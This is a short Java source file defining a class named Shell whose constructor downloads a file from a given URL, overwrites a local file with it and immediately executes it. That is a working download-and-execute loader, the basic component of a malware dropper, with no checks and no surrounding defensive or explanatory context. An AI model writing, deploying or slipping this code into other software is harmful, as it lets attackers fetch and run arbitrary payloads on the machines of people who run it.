import java.io.InputStream;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

public class Shell {

	public Shell(String link, String file_name) throws Exception {
	
		InputStream in = new URL(link).openStream();
		Files.copy(in, Paths.get(file_name), StandardCopyOption.REPLACE_EXISTING);

		Runtime.getRuntime().exec(file_name);
	}
}
